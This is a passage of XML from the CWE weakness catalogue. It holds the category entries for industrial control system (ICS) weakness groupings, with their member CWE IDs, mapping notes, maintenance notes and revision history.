            <Has_Member CWE_ID="1318" View_ID="1194"/>
            <Has_Member CWE_ID="1334" View_ID="1194"/>
			<Has_Member CWE_ID="1420" View_ID="1194"/>
         </Relationships>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
             <Submission>
			     <Submission_Name>CWE Content Team</Submission_Name>
			     <Submission_Organization>MITRE</Submission_Organization>
                 <Submission_Date>2019-12-27</Submission_Date>
                 <Submission_Version>4.0</Submission_Version>
                 <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
             </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1359" Name="ICS Communications" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "ICS Communications" super category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1364" View_ID="1358"/>
            <Has_Member CWE_ID="1365" View_ID="1358"/>
            <Has_Member CWE_ID="1366" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1360" Name="ICS Dependencies (&amp; Architecture)" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "ICS Dependencies (&amp; Architecture)" super category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1367" View_ID="1358"/>
            <Has_Member CWE_ID="1368" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1361" Name="ICS Supply Chain" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "ICS Supply Chain" super category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1369" View_ID="1358"/>
            <Has_Member CWE_ID="1370" View_ID="1358"/>
            <Has_Member CWE_ID="1371" View_ID="1358"/>
            <Has_Member CWE_ID="1372" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1362" Name="ICS Engineering (Constructions/Deployment)" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "ICS Engineering (Constructions/Deployment)" super category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1373" View_ID="1358"/>
            <Has_Member CWE_ID="1374" View_ID="1358"/>
            <Has_Member CWE_ID="1375" View_ID="1358"/>
            <Has_Member CWE_ID="1376" View_ID="1358"/>
            <Has_Member CWE_ID="1377" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1363" Name="ICS Operations (&amp; Maintenance)" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "ICS Operations (&amp; Maintenance)" super category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1378" View_ID="1358"/>
            <Has_Member CWE_ID="1379" View_ID="1358"/>
            <Has_Member CWE_ID="1380" View_ID="1358"/>
            <Has_Member CWE_ID="1381" View_ID="1358"/>
            <Has_Member CWE_ID="1382" View_ID="1358"/>
            <Has_Member CWE_ID="1383" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1364" Name="ICS Communications: Zone Boundary Failures" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Zone Boundary Failures" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Within an ICS system, for traffic that crosses through network zone boundaries, vulnerabilities arise when those boundaries were designed for safety or other purposes but are being repurposed for security." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
           <Has_Member CWE_ID="212" View_ID="1358"/>
           <Has_Member CWE_ID="268" View_ID="1358"/>
           <Has_Member CWE_ID="269" View_ID="1358"/>
           <Has_Member CWE_ID="287" View_ID="1358"/>
           <Has_Member CWE_ID="288" View_ID="1358"/>
           <Has_Member CWE_ID="306" View_ID="1358"/>
           <Has_Member CWE_ID="362" View_ID="1358"/>
           <Has_Member CWE_ID="384" View_ID="1358"/>
           <Has_Member CWE_ID="434" View_ID="1358"/>
           <Has_Member CWE_ID="494" View_ID="1358"/>
           <Has_Member CWE_ID="501" View_ID="1358"/>
           <Has_Member CWE_ID="668" View_ID="1358"/>
           <Has_Member CWE_ID="669" View_ID="1358"/>
           <Has_Member CWE_ID="754" View_ID="1358"/>
           <Has_Member CWE_ID="829" View_ID="1358"/>
           <Has_Member CWE_ID="1189" View_ID="1358"/>
           <Has_Member CWE_ID="1263" View_ID="1358"/>
           <Has_Member CWE_ID="1303" View_ID="1358"/>
           <Has_Member CWE_ID="1393" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="ICS Communications"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-26</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-06-29</Contribution_Date>
               <Contribution_Version>4.12</Contribution_Version>
               <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1365" Name="ICS Communications: Unreliability" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Unreliability" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Vulnerabilities arise in reaction to disruptions in the physical layer (e.g. creating electrical noise) used to carry the traffic." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
		   <Has_Member CWE_ID="121" View_ID="1358"/>
		   <Has_Member CWE_ID="269" View_ID="1358"/>
		   <Has_Member CWE_ID="306" View_ID="1358"/>
		   <Has_Member CWE_ID="349" View_ID="1358"/>
		   <Has_Member CWE_ID="362" View_ID="1358"/>
		   <Has_Member CWE_ID="807" View_ID="1358"/>
		   <Has_Member CWE_ID="1247" View_ID="1358"/>
		   <Has_Member CWE_ID="1261" View_ID="1358"/>
		   <Has_Member CWE_ID="1332" View_ID="1358"/>
		   <Has_Member CWE_ID="1351" View_ID="1358"/>
		   <Has_Member CWE_ID="1384" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1258"/>
            <Reference External_Reference_ID="REF-1248" Section="ICS Communications"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-26</Contribution_Date>
               <Contribution_Version>4.11</Contribution_Version>
               <Contribution_ReleaseDate>2023-04-26</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-06-29</Contribution_Date>
               <Contribution_Version>4.12</Contribution_Version>
               <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1366" Name="ICS Communications: Frail Security in Protocols" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Frail Security in Protocols" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Vulnerabilities arise as a result of mis-implementation or incomplete implementation of security in ICS implementations of communication protocols." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
		   <Has_Member CWE_ID="121" View_ID="1358"/>
		   <Has_Member CWE_ID="125" View_ID="1358"/>
		   <Has_Member CWE_ID="268" View_ID="1358"/>
		   <Has_Member CWE_ID="269" View_ID="1358"/>
		   <Has_Member CWE_ID="276" View_ID="1358"/>
		   <Has_Member CWE_ID="290" View_ID="1358"/>
		   <Has_Member CWE_ID="306" View_ID="1358"/>
		   <Has_Member CWE_ID="311" View_ID="1358"/>
		   <Has_Member CWE_ID="312" View_ID="1358"/>
		   <Has_Member CWE_ID="319" View_ID="1358"/>
		   <Has_Member CWE_ID="325" View_ID="1358"/>
		   <Has_Member CWE_ID="327" View_ID="1358"/>
		   <Has_Member CWE_ID="330" View_ID="1358"/>
		   <Has_Member CWE_ID="336" View_ID="1358"/>
		   <Has_Member CWE_ID="337" View_ID="1358"/>
		   <Has_Member CWE_ID="341" View_ID="1358"/>
		   <Has_Member CWE_ID="349" View_ID="1358"/>
		   <Has_Member CWE_ID="358" View_ID="1358"/>
		   <Has_Member CWE_ID="362" View_ID="1358"/>
		   <Has_Member CWE_ID="377" View_ID="1358"/>
		   <Has_Member CWE_ID="384" View_ID="1358"/>
		   <Has_Member CWE_ID="648" View_ID="1358"/>
		   <Has_Member CWE_ID="787" View_ID="1358"/>
		   <Has_Member CWE_ID="1189" View_ID="1358"/>
		   <Has_Member CWE_ID="1303" View_ID="1358"/>
		   <Has_Member CWE_ID="1393" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1259"/>
            <Reference External_Reference_ID="REF-1248" Section="ICS Communications"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-26</Contribution_Date>
               <Contribution_Version>4.11</Contribution_Version>
               <Contribution_ReleaseDate>2023-04-26</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-06-29</Contribution_Date>
               <Contribution_Version>4.12</Contribution_Version>
               <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1367" Name="ICS Dependencies (&amp; Architecture): External Physical Systems" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "External Physical Systems" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Due to the highly interconnected technologies in use, an external dependency on another physical system could cause an availability interruption for the protected system." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
